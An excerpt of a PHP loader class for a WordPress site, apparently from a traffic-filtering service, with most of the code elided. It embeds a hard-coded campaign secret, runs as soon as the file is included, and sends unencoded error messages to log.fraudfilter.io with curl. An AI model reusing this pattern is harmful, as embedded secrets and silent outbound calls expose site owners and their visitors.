...
class FraudFilterWordPressLoader_rnp24 {
    private $clid;
    ...
    public function __construct() {
        $this->clid = 'rnp24';
        $this->campaignSecret = '75c5e436-1891-413e-8e2e-8dd1574ad2b3';
    ...
    function fillAllPostHeaders() {
        $headers = [
            'content-length: 0',
            'X-FF-P: 75c5e436-1891-413e-8e2e-8dd1574ad2b3'
        ];
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://log.fraudfilter.io/ff-php?v=ff1&guid=rnp24&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_rnp24 = new FraudFilterWordPressLoader_rnp24();
$fraudFilterWordPressLoader_rnp24->run();
